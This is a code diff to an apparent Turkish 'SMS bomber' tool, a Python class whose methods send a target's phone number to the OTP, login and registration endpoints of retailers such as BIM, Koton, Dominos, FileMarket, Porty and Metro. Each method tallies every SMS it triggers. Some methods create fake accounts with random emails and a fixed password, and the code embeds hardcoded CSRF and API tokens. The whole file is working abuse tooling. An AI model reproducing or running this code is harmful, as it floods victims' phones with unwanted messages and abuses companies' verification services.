@@ -25,6 +25,44 @@ class SendSms():
             self.mail = ''.join(choice(ascii_lowercase) for i in range(22))+"@gmail.com"
 
 
+ # BİM
+    def Bim(self):
+        try:
+            headers = {
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+                "Content-Type": "application/json",
+                "Origin": "https://www.bim.com.tr",
+                "Referer": "https://www.bim.com.tr/"
+            }
+            bim = requests.post(
+                "https://bim.veesk.net/service/v1.0/account/login", 
+                json={"phone": self.phone}, 
+                headers=headers, 
+                timeout=6
+            )
+            if bim.status_code == 200:
+                print(f"{Fore.LIGHTGREEN_EX}[√] {Style.RESET_ALL}SMS Gönderildi! {self.phone} --> BIM")
+                self.adet += 1
+            else:
+                raise Exception(f"Status Code: {bim.status_code}")
+        except Exception:
+            print(f"{Fore.LIGHTRED_EX}[X] {Style.RESET_ALL}SMS Gönderilemedi! {self.phone} --> BIM")
+
+    # Koton
+    def Koton(self):
+        try:
+            url = "https://www.koton.com:443/users/register/"
+            headers = {"Content-Type": "multipart/form-data; boundary=sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk", "X-Project-Name": "rn-env", "Accept": "application/json, text/plain, */*", "X-App-Type": "akinon-mobile", "X-Requested-With": "XMLHttpRequest", "Accept-Language": "en-US,en;q=0.9", "Cache-Control": "no-store", "Accept-Encoding": "gzip, deflate", "X-App-Device": "ios", "Referer": "https://www.koton.com/", "User-Agent": "Koton/1 CFNetwork/1335.0.3.2 Darwin/21.6.0", "X-Csrftoken": "5DDwCmziQhjSP9iGhYE956HHw7wGbEhk5kef26XMFwhELJAWeaPK3A3vufxzuWcz"}
+            data = f"--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"first_name\"\r\n\r\nMemati\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"last_name\"\r\n\r\nBas\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"email\"\r\n\r\n{self.mail}\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"password\"\r\n\r\n31ABC..abc31\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"phone\"\r\n\r\n0{self.phone}\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"confirm\"\r\n\r\ntrue\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"sms_allowed\"\r\n\r\ntrue\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"email_allowed\"\r\n\r\ntrue\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"date_of_birth\"\r\n\r\n1993-07-02\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"call_allowed\"\r\n\r\ntrue\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"gender\"\r\n\r\n\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk--\r\n"
+            r = requests.post(url, headers=headers, data=data, timeout=6)
+            if r.status_code == 202:
+                print(f"{Fore.LIGHTGREEN_EX}[√] {Style.RESET_ALL}SMS Gönderildi! {self.phone} --> koton.com")
+                self.adet += 1
+            else:
+                raise
+        except:
+            print(f"{Fore.LIGHTRED_EX}[X] {Style.RESET_ALL}SMS Gönderilemedi! {self.phone} --> koton.com")
+
     #kahvedunyasi.com
     def KahveDunyasi(self):    
         try:    
@@ -33,84 +71,12 @@ class SendSms():
             json={"countryCode": "90", "phoneNumber": self.phone}
             r = requests.post(url, headers=headers, json=json, timeout=6)
             if r.json()["processStatus"] == "Success":
-                print(f"{Fore.LIGHTGREEN_EX}[√] {Style.RESET_ALL}SMS Gönderildi! {self.phone} --> KahveDünyası")
+                print(f"{Fore.LIGHTGREEN_EX}[√] {Style.RESET_ALL}SMS Gönderildi! {self.phone} --> api.kahvedunyasi.com")
                 self.adet += 1
             else:
                 raise
         except:    
-            print(f"{Fore.LIGHTRED_EX}[X] {Style.RESET_ALL}SMS Gönderilemedi! {self.phone} --> KahveDünyası")
-        
-     #bim_guncel
-    def Bim(self):
-        try:
-            headers = {
-                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
-                "Content-Type": "application/json",
-                "Origin": "https://www.bim.com.tr",
-                "Referer": "https://www.bim.com.tr/"
-            }
-            bim = requests.post("https://bim.veesk.net:443/service/v1.0/account/login", 
-                                json={"phone": self.phone}, 
-                                headers=headers, 
-                                timeout=10)
-            if bim.status_code == 200:
-                print(f"{Fore.LIGHTGREEN_EX}[√] {Style.RESET_ALL}SMS Gönderildi! {self.phone} --> BIM")
-                self.adet += 1
-            else:
-                print(f"{Fore.RED}[!] Sunucu Hatası: {bim.status_code}")
-                raise
-        except Exception as e:
-            print(f"{Fore.LIGHTRED_EX}[X] {Style.RESET_ALL}SMS Gönderilemedi! {self.phone} --> BIM")
-
-    #file.com.tr
-    def File(self):
-        try:
-            url = "https://api.filemarket.com.tr:443/v1/otp/send"
-            headers = {"Accept": "*/*", "Content-Type": "application/json", "User-Agent": "filemarket/2022060120013 CFNetwork/1335.0.3.2 Darwin/21.6.0", "X-Os": "IOS", "X-Version": "1.7", "Accept-Language": "en-US,en;q=0.9", "Accept-Encoding": "gzip, deflate"}
-            json={"mobilePhoneNumber": f"90{self.phone}"}
-            r = requests.post(url, headers=headers, json=json, timeout=6)
-            if r.json()["responseType"] == "SUCCESS":
-                print(f"{Fore.LIGHTGREEN_EX}[√] {Style.RESET_ALL}SMS Gönderildi! {self.phone} --> FileMarket")
-                self.adet += 1
-            else:
-                raise
-        except:
-            print(f"{Fore.LIGHTRED_EX}[X] {Style.RESET_ALL}SMS Gönderilemedi! {self.phone} --> FileMarket")
-
-    #evidea.com
-    def Evidea(self):
-        try:
-            url = "https://www.evidea.com:443/users/register/"
-            headers = {"Content-Type": "multipart/form-data; boundary=fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi", "X-Project-Name": "undefined", "Accept": "application/json, text/plain, */*", "X-App-Type": "akinon-mobile", "X-Requested-With": "XMLHttpRequest", "Accept-Language": "tr-TR,tr;q=0.9", "Cache-Control": "no-store", "Accept-Encoding": "gzip, deflate", "X-App-Device": "ios", "Referer": "https://www.evidea.com/", "User-Agent": "Evidea/1 CFNetwork/1335.0.3 Darwin/21.6.0", "X-Csrftoken": "7NdJbWSYnOdm70YVLIyzmylZwWbqLFbtsrcCQdLAEbnx7a5Tq4njjS3gEElZxYps"}
-            data = f"--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"first_name\"\r\n\r\nMemati\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"last_name\"\r\n\r\nBas\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"email\"\r\n\r\n{self.mail}\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"email_allowed\"\r\n\r\nfalse\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"sms_allowed\"\r\n\r\ntrue\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"password\"\r\n\r\n31ABC..abc31\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"phone\"\r\n\r\n0{self.phone}\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"confirm\"\r\n\r\ntrue\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi--\r\n"
-            r = requests.post(url, headers=headers, data=data, timeout=6)      
-            if r.status_code == 202:
-                print(f"{Fore.LIGHTGREEN_EX}[√] {Style.RESET_ALL}SMS Gönderildi! {self.phone} --> Evidea")
-                self.adet += 1
-            else:
-                raise
-        except:
-            print(f"{Fore.LIGHTRED_EX}[X] {Style.RESET_ALL}SMS Gönderilemedi! {self.phone} --> Evidea") 
- 
-    # Porty
-    def Porty(self):
-        try:
-            url = "https://panel.porty.tech:443/api.php?"
-            headers = {
-                "User-Agent": "Porty/1 CFNetwork/1335.0.3.4",
-                "Content-Type": "application/json"
-            }
-
-            payload = {"job": "start_login", "phone": self.phone}
-            
-            r = requests.post(url, json=payload, headers=headers, timeout=10)
-            if "success" in r.text.lower() or r.status_code == 200:
-                print(f"{Fore.LIGHTGREEN_EX}[√] {Style.RESET_ALL}SMS Gönderildi! {self.phone} --> Porty")
-                self.adet += 1
-            else:
-                raise
-        except:
-            print(f"{Fore.LIGHTRED_EX}[X] {Style.RESET_ALL}SMS Gönderilemedi! {self.phone} --> Porty")
+            print(f"{Fore.LIGHTRED_EX}[X] {Style.RESET_ALL}SMS Gönderilemedi! {self.phone} --> api.kahvedunyasi.com")
 
     #dominos.com.tr
     def Dominos(self):
@@ -120,11 +86,57 @@ class SendSms():
             json={"email": self.mail, "isSure": False, "mobilePhone": self.phone}
             r = requests.post(url, headers=headers, json=json, timeout=6)
             if r.json()["isSuccess"] == True:
-                print(f"{Fore.LIGHTGREEN_EX}[√] {Style.RESET_ALL}SMS Gönderildi! {self.phone} --> Dominos")
+                print(f"{Fore.LIGHTGREEN_EX}[√] {Style.RESET_ALL}SMS Gönderildi! {self.phone} --> frontend.dominos.com.tr")
                 self.adet += 1
             else:
                 raise
         except:
-            print(f"{Fore.LIGHTRED_EX}[X] {Style.RESET_ALL}SMS Gönderilemedi! {self.phone} --> Dominos")
+            print(f"{Fore.LIGHTRED_EX}[X] {Style.RESET_ALL}SMS Gönderilemedi! {self.phone} --> frontend.dominos.com.tr")
+
+    #file.com.tr
+    def File(self):
+        try:
+            url = "https://api.filemarket.com.tr:443/v1/otp/send"
+            headers = {"Accept": "*/*", "Content-Type": "application/json", "User-Agent": "filemarket/2022060120013 CFNetwork/1335.0.3.2 Darwin/21.6.0", "X-Os": "IOS", "X-Version": "1.7", "Accept-Language": "en-US,en;q=0.9", "Accept-Encoding": "gzip, deflate"}
+            json={"mobilePhoneNumber": f"90{self.phone}"}
+            r = requests.post(url, headers=headers, json=json, timeout=6)
+            if r.json()["responseType"] == "SUCCESS":
+                print(f"{Fore.LIGHTGREEN_EX}[√] {Style.RESET_ALL}SMS Gönderildi! {self.phone} --> api.filemarket.com.tr")
+                self.adet += 1
+            else:
+                raise
+        except:
+            print(f"{Fore.LIGHTRED_EX}[X] {Style.RESET_ALL}SMS Gönderilemedi! {self.phone} --> api.filemarket.com.tr")
+
+    #porty.tech
+    def Porty(self):
+        try:
+            url = "https://panel.porty.tech:443/api.php?"
+            headers = {"Accept": "*/*", "Content-Type": "application/json; charset=UTF-8", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9", "User-Agent": "Porty/1 CFNetwork/1335.0.3.4 Darwin/21.6.0", "Token": "q2zS6kX7WYFRwVYArDdM66x72dR6hnZASZ"}
+            json={"job": "start_login", "phone": self.phone}
+            r = requests.post(url=url, json=json, headers=headers, timeout=6)
+            if r.json()["status"]== "success":
+                print(f"{Fore.LIGHTGREEN_EX}[√] {Style.RESET_ALL}SMS Gönderildi! {self.phone} --> panel.porty.tech")
+                self.adet += 1
+            else:
+                raise
+        except:
+            print(f"{Fore.LIGHTRED_EX}[X] {Style.RESET_ALL}SMS Gönderilemedi! {self.phone} --> panel.porty.tech")
+
+
+    #metro-tr.com
+    def Metro(self):
+        try:
+            url = "https://mobile.metro-tr.com:443/api/mobileAuth/validateSmsSend"
+            headers = {"Accept": "*/*", "Content-Type": "application/json; charset=utf-8", "Accept-Encoding": "gzip, deflate, br", "Applicationversion": "2.4.1", "Applicationplatform": "2", "User-Agent": "Metro Turkiye/2.4.1 (com.mcctr.mobileapplication; build:4; iOS 15.8.3) Alamofire/4.9.1", "Accept-Language": "en-BA;q=1.0, tr-BA;q=0.9, bs-BA;q=0.8", "Connection": "keep-alive"}
+            json={"methodType": "2", "mobilePhoneNumber": self.phone}
+            r = requests.post(url, headers=headers, json=json, timeout=6)
+            if r.json()["status"] == "success":
+                print(f"{Fore.LIGHTGREEN_EX}[√] {Style.RESET_ALL}SMS Gönderildi! {self.phone} --> mobile.metro-tr.com")
+                self.adet += 1
+            else:
+                raise
+        except:
+            print(f"{Fore.LIGHTRED_EX}[X] {Style.RESET_ALL}SMS Gönderilemedi! {self.phone} --> mobile.metro-tr.com")
 
 #Bu Tool "https://github.com/s4m3dnotfound/LegacySMS" adresine aittir.
